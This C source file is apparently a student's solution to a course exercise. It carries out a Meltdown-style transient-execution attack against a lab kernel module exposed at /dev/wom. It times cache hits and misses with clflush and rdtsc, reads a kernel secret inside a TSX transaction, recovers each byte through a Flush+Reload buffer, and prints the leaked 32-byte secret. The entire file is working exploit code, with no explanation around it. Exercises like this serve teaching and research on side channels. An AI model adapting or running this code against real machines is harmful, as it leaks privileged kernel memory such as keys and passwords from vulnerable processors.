#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <inttypes.h>
#include <malloc.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <immintrin.h>


#define SECRET_LENGTH 32

#define WOM_MAGIC_NUM 0x1337
#define WOM_GET_ADDRESS _IOR(WOM_MAGIC_NUM, 0, unsigned long)



void *wom_get_address(int fd) {
    void *addr = NULL;

    if (ioctl(fd, WOM_GET_ADDRESS, &addr) < 0)
        return NULL;

    return addr;
}

void clflush(volatile void *p){
	asm volatile ("clflush (%0)" :: "r"(p));
}


/*I TOOK THIS FUNCTION FROM https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-yarom.pdf */
unsigned long probe( unsigned char *address ) {
    volatile unsigned long time;
    asm __volatile__ (
        "  mfence             \n"
        "  lfence             \n"
        "  rdtsc              \n"
        "  lfence             \n"
        "  movl %%eax, %%esi  \n"
        "  movl (%1), %%eax   \n"
        "  lfence             \n"
        "  rdtsc              \n"
        "  subl %%esi, %%eax  \n"
        : "=a" (time)
        : "c" (address)
        :  "%esi", "%edx");
    return time ;
}

int main(int argc, char *argv[]) {
    char leaked_secret[SECRET_LENGTH + 1] = {0};
    char *secret_addr;
    int fd;
    
    int stride=4096;
    int reloadbuffer_size=256;
    unsigned char *reloadbuffer;
    unsigned long miss_val=0,hit_val=0;
    unsigned long max = 0;

    int l=0;
    unsigned long tmp;
    int check_buf[256];
    int thesi;
    int t=0;
    int flag =0;
    unsigned int noth=0;
    unsigned char as = 90;

    fd = open("/dev/wom", O_RDONLY);

    if (fd < 0) {
        perror("open");
        fprintf(stderr, "error: unable to open /dev/wom. "
            "Please build and load the wom kernel module.\n");
        return -1;
    }

    secret_addr = wom_get_address(fd);

    reloadbuffer = malloc((reloadbuffer_size * stride));

    for(int i=0;i<reloadbuffer_size*stride;i++){
        reloadbuffer[i] = 0;
    }
    probe(reloadbuffer+(3*stride));
    
    for(int i=0;i<reloadbuffer_size*stride;i++){
        clflush(reloadbuffer+i);
    }

    for(int i=0;i<10000;i++){
        clflush(reloadbuffer+(4*stride));
        miss_val =miss_val+probe(reloadbuffer+(4*stride));
        hit_val=hit_val+probe(reloadbuffer+(4*stride));
    }
    printf("miss: %lu, hit: %lu\n",(miss_val/10000),(hit_val/10000));

    /*
     * Your MELTDOWN code goes here
     */

    for(int i=0;i<256;i++)
        check_buf[i] = 0;

    for(int i=0;i<reloadbuffer_size*stride;i++){
        clflush(reloadbuffer+i);
    }


    for(int i=0;i<32;i++){
        for(int i=0;i<reloadbuffer_size*stride;i++){
            clflush(reloadbuffer+i);
        }

        for(int h=0;h<10000;h++){

            for(int n=0;n<reloadbuffer_size;n++){
                clflush(reloadbuffer+(n*stride));
            }   

            if( pread(fd, NULL, SECRET_LENGTH, 0) == -1 ){
                perror("Failed to read\n");
            }

            if (_xbegin() == _XBEGIN_STARTED) {
                *(volatile char*)(reloadbuffer+(*(secret_addr)*stride));
                _xend();
            }


            for(int k=0;k<reloadbuffer_size;k++){
                l = ((k * 167) + 13) & 0xff;
                tmp = probe(reloadbuffer+(l*stride));
                //printf("%lu -> %d\n",tmp,l);
                if(tmp<=(((hit_val/10000)+(miss_val/10000))/2)){
                    check_buf[l]=check_buf[l] + 1; 
                }
            }
        }
        for(int f=0;f<256;f++){
            if(max<check_buf[f]){
                max = check_buf[f];
                thesi = f;
            }
        }
       // printf("thesi %d\n",thesi);
        leaked_secret[t++]=thesi;

        for(int i=0;i<256;i++)
            check_buf[i] = 0;
        max = 0;

        secret_addr++;

    }
    printf("Secret: %s\n", leaked_secret);

    close(fd);

    return 0;

}
